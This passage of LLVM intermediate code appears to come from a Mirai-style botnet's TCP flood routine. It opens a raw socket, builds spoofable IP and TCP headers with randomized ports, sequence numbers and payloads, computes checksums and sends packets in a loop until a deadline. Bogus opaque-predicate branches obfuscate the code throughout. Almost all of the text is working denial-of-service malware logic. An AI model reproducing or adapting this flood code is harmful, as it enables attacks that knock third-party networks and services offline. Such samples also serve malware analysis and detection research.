  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %27, align 1
  %98 = load i8, i8* %9, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 0, i32 512)
  store i32 %100, i32* %28, align 4
  %101 = load i8, i8* %9, align 1
  %102 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %103 = call i32 @attack_get_opt_int(i8 zeroext %101, %struct.attack_option* %102, i8 zeroext 1, i32 1)
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %29, align 1
  %105 = load i8, i8* %9, align 1
  %106 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %107 = load i32, i32* @LOCAL_ADDR, align 4
  %108 = call i32 @attack_get_opt_ip(i8 zeroext %105, %struct.attack_option* %106, i8 zeroext 24, i32 %107)
  store i32 %108, i32* %30, align 4
  %109 = call i64 @time(i64* null) #6
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = add nsw i64 %109, %111
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %31, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %114, i32* %12, align 4
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %5
  br label %606

; <label>:117:                                    ; preds = %5
  %118 = load i32, i32* @x.25
  %119 = load i32, i32* @y.26
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %117
  store i32 1, i32* %11, align 4
  %126 = load i32, i32* %12, align 4
  %127 = bitcast i32* %11 to i8*
  %128 = call i32 @setsockopt(i32 %126, i32 0, i32 3, i8* %127, i32 4) #6
  %129 = icmp eq i32 %128, -1
  %130 = load i32, i32* @x.25
  %131 = load i32, i32* @y.26
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %129, label %138, label %141

; <label>:138:                                    ; preds = %originalBBpart2
  %139 = load i32, i32* %12, align 4
  %140 = call i32 @close(i32 %139)
  br label %606

; <label>:141:                                    ; preds = %originalBBpart2
  store i32 0, i32* %11, align 4
  br label %142

; <label>:142:                                    ; preds = %321, %141
  %143 = load i32, i32* %11, align 4
  %144 = load i8, i8* %7, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp slt i32 %143, %145
  br i1 %146, label %147, label %324

; <label>:147:                                    ; preds = %142
  %148 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %149 = load i8**, i8*** %13, align 8
  %150 = load i32, i32* %11, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds i8*, i8** %149, i64 %151
  store i8* %148, i8** %152, align 8
  %153 = load i8**, i8*** %13, align 8
  %154 = load i32, i32* %11, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds i8*, i8** %153, i64 %155
  %157 = load i8*, i8** %156, align 8
  %158 = bitcast i8* %157 to %struct.iphdr*
  store %struct.iphdr* %158, %struct.iphdr** %32, align 8
  %159 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1
  %161 = bitcast %struct.iphdr* %160 to %struct.tcphdr*
  store %struct.tcphdr* %161, %struct.tcphdr** %33, align 8
  %162 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %163 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %162, i64 1
  %164 = bitcast %struct.tcphdr* %163 to i8*
  store i8* %164, i8** %34, align 8
  %165 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %166 = bitcast %struct.iphdr* %165 to i8*
  %167 = load i8, i8* %166, align 4
  %168 = and i8 %167, 15
  %169 = or i8 %168, 64
  store i8 %169, i8* %166, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %171 = bitcast %struct.iphdr* %170 to i8*
  %172 = load i8, i8* %171, align 4
  %173 = and i8 %172, -16
  %174 = or i8 %173, 5
  store i8 %174, i8* %171, align 4
  %175 = load i8, i8* %14, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 1
  store i8 %175, i8* %177, align 1
  %178 = load i32, i32* %28, align 4
  %179 = sext i32 %178 to i64
  %180 = add i64 40, %179
  %181 = trunc i64 %180 to i16
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 2
  store i16 %182, i16* %184, align 2
  %185 = load i16, i16* %15, align 2
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 3
  store i16 %186, i16* %188, align 4
  %189 = load i8, i8* %16, align 1
  %190 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 5
  store i8 %189, i8* %191, align 4
  %192 = load i8, i8* %17, align 1
  %193 = icmp ne i8 %192, 0
  br i1 %193, label %194, label %198

; <label>:194:                                    ; preds = %147
  %195 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %196 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 4
  store i16 %195, i16* %197, align 2
  br label %198

; <label>:198:                                    ; preds = %194, %147
  %199 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 6
  store i8 6, i8* %200, align 1
  %201 = load i32, i32* %30, align 4
  %202 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 8
  store i32 %201, i32* %203, align 4
  %204 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %205 = load i32, i32* %11, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 1
  %209 = load i32, i32* %208, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 9
  store i32 %209, i32* %211, align 4
  %212 = load i16, i16* %18, align 2
  %213 = call zeroext i16 @htons(i16 zeroext %212) #7
  %214 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  store i16 %213, i16* %215, align 4
  %216 = load i16, i16* %19, align 2
  %217 = call zeroext i16 @htons(i16 zeroext %216) #7
  %218 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 1
  store i16 %217, i16* %219, align 2
  %220 = load i32, i32* %20, align 4
  %221 = trunc i32 %220 to i16
  %222 = call zeroext i16 @htons(i16 zeroext %221) #7
  %223 = zext i16 %222 to i32
  %224 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 2
  store i32 %223, i32* %225, align 4
  %226 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %228, -241
  %230 = or i16 %229, 80
  store i16 %230, i16* %227, align 4
  %231 = load i8, i8* %22, align 1
  %232 = sext i8 %231 to i16
  %233 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 4
  %235 = load i16, i16* %234, align 4
  %236 = and i16 %232, 1
  %237 = shl i16 %236, 13
  %238 = and i16 %235, -8193
  %239 = or i16 %238, %237
  store i16 %239, i16* %234, align 4
  %240 = load i8, i8* %23, align 1
  %241 = sext i8 %240 to i16
  %242 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 4
  %244 = load i16, i16* %243, align 4
  %245 = and i16 %241, 1
  %246 = shl i16 %245, 12
  %247 = and i16 %244, -4097
  %248 = or i16 %247, %246
  store i16 %248, i16* %243, align 4
  %249 = load i8, i8* %24, align 1
  %250 = sext i8 %249 to i16
  %251 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 4
  %253 = load i16, i16* %252, align 4
  %254 = and i16 %250, 1
  %255 = shl i16 %254, 11
  %256 = and i16 %253, -2049
  %257 = or i16 %256, %255
  store i16 %257, i16* %252, align 4
  %258 = load i8, i8* %25, align 1
  %259 = sext i8 %258 to i16
  %260 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = and i16 %259, 1
  %264 = shl i16 %263, 10
  %265 = and i16 %262, -1025
  %266 = or i16 %265, %264
  store i16 %266, i16* %261, align 4
  %267 = load i8, i8* %26, align 1
  %268 = sext i8 %267 to i16
  %269 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = and i16 %268, 1
  %273 = shl i16 %272, 9
  %274 = and i16 %271, -513
  %275 = or i16 %274, %273
  store i16 %275, i16* %270, align 4
  %276 = load i8, i8* %27, align 1
  %277 = sext i8 %276 to i16
  %278 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 4
  %280 = load i16, i16* %279, align 4
  %281 = and i16 %277, 1
  %282 = shl i16 %281, 8
  %283 = and i16 %280, -257
  %284 = or i16 %283, %282
  store i16 %284, i16* %279, align 4
  %285 = call i32 @rand_next()
  %286 = and i32 %285, 65535
  %287 = trunc i32 %286 to i16
  %288 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %289 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %288, i32 0, i32 5
  store i16 %287, i16* %289, align 2
  %290 = load i8, i8* %24, align 1
  %291 = icmp ne i8 %290, 0
  br i1 %291, label %292, label %314

; <label>:292:                                    ; preds = %198
  %293 = load i32, i32* @x.25
  %294 = load i32, i32* @y.26
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %292
  %301 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 4
  %303 = load i16, i16* %302, align 4
  %304 = and i16 %303, -2049
  %305 = or i16 %304, 2048
  store i16 %305, i16* %302, align 4
  %306 = load i32, i32* @x.25
  %307 = load i32, i32* @y.26
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBBpart212, label %originalBB1alteredBB

originalBBpart212:                                ; preds = %originalBB1
  br label %314

; <label>:314:                                    ; preds = %originalBBpart212, %198
  %315 = load i8*, i8** %34, align 8
  %316 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %315, i32 %316)
  %317 = load i8*, i8** %34, align 8
  %318 = load i32, i32* %28, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds i8, i8* %317, i64 %319
  store i8 0, i8* %320, align 1
  br label %321

; <label>:321:                                    ; preds = %314
  %322 = load i32, i32* %11, align 4
  %323 = add nsw i32 %322, 1
  store i32 %323, i32* %11, align 4
  br label %142

; <label>:324:                                    ; preds = %142
  %325 = load i32, i32* @x.25
  %326 = load i32, i32* @y.26
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %324
  %333 = load i32, i32* @x.25
  %334 = load i32, i32* @y.26
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %341

; <label>:341:                                    ; preds = %originalBBpart265, %originalBBpart216
  %342 = load i32, i32* @x.25
  %343 = load i32, i32* @y.26
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %341
  store i32 0, i32* %11, align 4
  %350 = load i32, i32* @x.25
  %351 = load i32, i32* @y.26
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %358

; <label>:358:                                    ; preds = %originalBBpart261, %originalBBpart220
  %359 = load i32, i32* %11, align 4
  %360 = load i8, i8* %7, align 1
  %361 = zext i8 %360 to i32
  %362 = icmp slt i32 %359, %361
  br i1 %362, label %363, label %583

; <label>:363:                                    ; preds = %358
  %364 = load i32, i32* @x.25
  %365 = load i32, i32* @y.26
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %363
  %372 = load i8**, i8*** %13, align 8
  %373 = load i32, i32* %11, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds i8*, i8** %372, i64 %374
  %376 = load i8*, i8** %375, align 8
  store i8* %376, i8** %35, align 8
  %377 = load i8*, i8** %35, align 8
  %378 = bitcast i8* %377 to %struct.iphdr*
  store %struct.iphdr* %378, %struct.iphdr** %36, align 8
  %379 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i64 1
  %381 = bitcast %struct.iphdr* %380 to %struct.tcphdr*
  store %struct.tcphdr* %381, %struct.tcphdr** %37, align 8
  %382 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i64 1
  %384 = bitcast %struct.tcphdr* %383 to i8*
  store i8* %384, i8** %38, align 8
  %385 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %386 = load i32, i32* %11, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %385, i64 %387
  %389 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %388, i32 0, i32 2
  %390 = load i8, i8* %389, align 4
  %391 = zext i8 %390 to i32
  %392 = icmp slt i32 %391, 32
  %393 = load i32, i32* @x.25
  %394 = load i32, i32* @y.26
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %392, label %401, label %422

; <label>:401:                                    ; preds = %originalBBpart224
  %402 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %403 = load i32, i32* %11, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %402, i64 %404
  %406 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %405, i32 0, i32 1
  %407 = load i32, i32* %406, align 4
  %408 = call i32 @ntohl(i32 %407) #7
  %409 = call i32 @rand_next()
  %410 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %411 = load i32, i32* %11, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %410, i64 %412
  %414 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %413, i32 0, i32 2
  %415 = load i8, i8* %414, align 4
  %416 = zext i8 %415 to i32
  %417 = lshr i32 %409, %416
  %418 = add i32 %408, %417
  %419 = call i32 @htonl(i32 %418) #7
  %420 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %421 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %420, i32 0, i32 9
  store i32 %419, i32* %421, align 4
  br label %422

; <label>:422:                                    ; preds = %401, %originalBBpart224
  %423 = load i32, i32* %30, align 4
  %424 = icmp eq i32 %423, -1
  br i1 %424, label %425, label %445

; <label>:425:                                    ; preds = %422
  %426 = load i32, i32* @x.25
  %427 = load i32, i32* @y.26
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %425
  %434 = call i32 @rand_next()
  %435 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 8
  store i32 %434, i32* %436, align 4
  %437 = load i32, i32* @x.25
  %438 = load i32, i32* @y.26
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %445

; <label>:445:                                    ; preds = %originalBBpart228, %422
  %446 = load i16, i16* %15, align 2
  %447 = zext i16 %446 to i32
  %448 = icmp eq i32 %447, 65535
  br i1 %448, label %449, label %471

; <label>:449:                                    ; preds = %445
  %450 = load i32, i32* @x.25
  %451 = load i32, i32* @y.26
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %449
  %458 = call i32 @rand_next()
  %459 = and i32 %458, 65535
  %460 = trunc i32 %459 to i16
  %461 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 3
  store i16 %460, i16* %462, align 4
  %463 = load i32, i32* @x.25
  %464 = load i32, i32* @y.26
  %465 = sub i32 %463, 1
  %466 = mul i32 %463, %465
  %467 = urem i32 %466, 2
  %468 = icmp eq i32 %467, 0
  %469 = icmp slt i32 %464, 10
  %470 = or i1 %468, %469
  br i1 %470, label %originalBBpart242, label %originalBB30alteredBB

originalBBpart242:                                ; preds = %originalBB30
  br label %471

; <label>:471:                                    ; preds = %originalBBpart242, %445
  %472 = load i16, i16* %18, align 2
  %473 = zext i16 %472 to i32
  %474 = icmp eq i32 %473, 65535
  br i1 %474, label %475, label %481

; <label>:475:                                    ; preds = %471
  %476 = call i32 @rand_next()
  %477 = and i32 %476, 65535
  %478 = trunc i32 %477 to i16
  %479 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %480 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %479, i32 0, i32 0
  store i16 %478, i16* %480, align 4
  br label %481

; <label>:481:                                    ; preds = %475, %471
  %482 = load i16, i16* %19, align 2
  %483 = zext i16 %482 to i32
  %484 = icmp eq i32 %483, 65535
  br i1 %484, label %485, label %491

; <label>:485:                                    ; preds = %481
  %486 = call i32 @rand_next()
  %487 = and i32 %486, 65535
  %488 = trunc i32 %487 to i16
  %489 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 1
  store i16 %488, i16* %490, align 2
  br label %491

; <label>:491:                                    ; preds = %485, %481
  %492 = load i32, i32* %20, align 4
  %493 = icmp eq i32 %492, 65535
  br i1 %493, label %494, label %498

; <label>:494:                                    ; preds = %491
  %495 = call i32 @rand_next()
  %496 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 2
  store i32 %495, i32* %497, align 4
  br label %498

; <label>:498:                                    ; preds = %494, %491
  %499 = load i32, i32* %21, align 4
  %500 = icmp eq i32 %499, 65535
  br i1 %500, label %501, label %505

; <label>:501:                                    ; preds = %498
  %502 = call i32 @rand_next()
  %503 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %504 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %503, i32 0, i32 3
  store i32 %502, i32* %504, align 4
  br label %505

; <label>:505:                                    ; preds = %501, %498
  %506 = load i8, i8* %29, align 1
  %507 = icmp ne i8 %506, 0
  br i1 %507, label %508, label %515

; <label>:508:                                    ; preds = %505
  %509 = load i8*, i8** %38, align 8
  %510 = load i32, i32* %28, align 4
  call void @rand_alphastr(i8* %509, i32 %510)
  %511 = load i8*, i8** %38, align 8
  %512 = load i32, i32* %28, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds i8, i8* %511, i64 %513
  store i8 0, i8* %514, align 1
  br label %515

; <label>:515:                                    ; preds = %508, %505
  %516 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %517 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %516, i32 0, i32 7
  store i16 0, i16* %517, align 2
  %518 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %519 = bitcast %struct.iphdr* %518 to i16*
  %520 = call zeroext i16 @checksum_generic(i16* %519, i32 20)
  %521 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i32 0, i32 7
  store i16 %520, i16* %522, align 2
  %523 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 6
  store i16 0, i16* %524, align 4
  %525 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %526 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %527 = bitcast %struct.tcphdr* %526 to i8*
  %528 = load i32, i32* %28, align 4
  %529 = sext i32 %528 to i64
  %530 = add i64 20, %529
  %531 = trunc i64 %530 to i16
  %532 = call zeroext i16 @htons(i16 zeroext %531) #7
  %533 = load i32, i32* %28, align 4
  %534 = sext i32 %533 to i64
  %535 = add i64 20, %534
  %536 = trunc i64 %535 to i32
  %537 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %525, i8* %527, i16 zeroext %532, i32 %536)
  %538 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 6
  store i16 %537, i16* %539, align 4
  %540 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %541 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %540, i32 0, i32 1
  %542 = load i16, i16* %541, align 2
  %543 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %544 = load i32, i32* %11, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %543, i64 %545
  %547 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %546, i32 0, i32 0
  %548 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %547, i32 0, i32 1
  store i16 %542, i16* %548, align 2
  %549 = load i32, i32* %12, align 4
  %550 = load i8*, i8** %35, align 8
  %551 = load i32, i32* %28, align 4
  %552 = sext i32 %551 to i64
  %553 = add i64 40, %552
  %554 = bitcast %union.__CONST_SOCKADDR_ARG* %39 to %struct.sockaddr**
  %555 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %556 = load i32, i32* %11, align 4
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %555, i64 %557
  %559 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %558, i32 0, i32 0
  %560 = bitcast %struct.sockaddr_in* %559 to %struct.sockaddr*
  store %struct.sockaddr* %560, %struct.sockaddr** %554, align 8
  %561 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %39, i32 0, i32 0
  %562 = load %struct.sockaddr*, %struct.sockaddr** %561, align 8
  %563 = call i64 @sendto(i32 %549, i8* %550, i64 %553, i32 16384, %struct.sockaddr* %562, i32 16)
  br label %564

; <label>:564:                                    ; preds = %515
  %565 = load i32, i32* @x.25
  %566 = load i32, i32* @y.26
  %567 = sub i32 %565, 1
  %568 = mul i32 %565, %567
  %569 = urem i32 %568, 2
  %570 = icmp eq i32 %569, 0
  %571 = icmp slt i32 %566, 10
  %572 = or i1 %570, %571
  br i1 %572, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %564
  %573 = load i32, i32* %11, align 4
  %574 = add nsw i32 %573, 1
  store i32 %574, i32* %11, align 4
  %575 = load i32, i32* @x.25
  %576 = load i32, i32* @y.26
  %577 = sub i32 %575, 1
  %578 = mul i32 %575, %577
  %579 = urem i32 %578, 2
  %580 = icmp eq i32 %579, 0
  %581 = icmp slt i32 %576, 10
  %582 = or i1 %580, %581
  br i1 %582, label %originalBBpart261, label %originalBB44alteredBB

originalBBpart261:                                ; preds = %originalBB44
  br label %358

; <label>:583:                                    ; preds = %358
  %584 = call i64 @time(i64* null) #6
  %585 = load i32, i32* %31, align 4
  %586 = sext i32 %585 to i64
  %587 = icmp sgt i64 %584, %586
  br i1 %587, label %588, label %589

; <label>:588:                                    ; preds = %583
  br label %606

; <label>:589:                                    ; preds = %583
  %590 = load i32, i32* @x.25
  %591 = load i32, i32* @y.26
  %592 = sub i32 %590, 1
  %593 = mul i32 %590, %592
  %594 = urem i32 %593, 2
  %595 = icmp eq i32 %594, 0
  %596 = icmp slt i32 %591, 10
  %597 = or i1 %595, %596
  br i1 %597, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %589
  %598 = load i32, i32* @x.25
  %599 = load i32, i32* @y.26
  %600 = sub i32 %598, 1
  %601 = mul i32 %598, %600
  %602 = urem i32 %601, 2
  %603 = icmp eq i32 %602, 0
  %604 = icmp slt i32 %599, 10
  %605 = or i1 %603, %604
  br i1 %605, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %341

; <label>:606:                                    ; preds = %588, %138, %116
  %607 = load i32, i32* @x.25
  %608 = load i32, i32* @y.26
  %609 = sub i32 %607, 1
  %610 = mul i32 %607, %609
  %611 = urem i32 %610, 2
  %612 = icmp eq i32 %611, 0
  %613 = icmp slt i32 %608, 10
  %614 = or i1 %612, %613
  br i1 %614, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %606
  %615 = load i32, i32* @x.25
  %616 = load i32, i32* @y.26
  %617 = sub i32 %615, 1
  %618 = mul i32 %615, %617
  %619 = urem i32 %618, 2
  %620 = icmp eq i32 %619, 0
  %621 = icmp slt i32 %616, 10
  %622 = or i1 %620, %621
  br i1 %622, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %117
  store i32 1, i32* %11, align 4
  %623 = load i32, i32* %12, align 4
  %624 = bitcast i32* %11 to i8*
  %625 = call i32 @setsockopt(i32 %623, i32 0, i32 3, i8* %624, i32 4) #6
  %626 = icmp eq i32 %625, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %292
  %627 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %628 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %627, i32 0, i32 4
  %629 = load i16, i16* %628, align 4
  %_ = sub i16 %629, -2049
  %gen = mul i16 %_, -2049
  %630 = and i16 %629, -2049
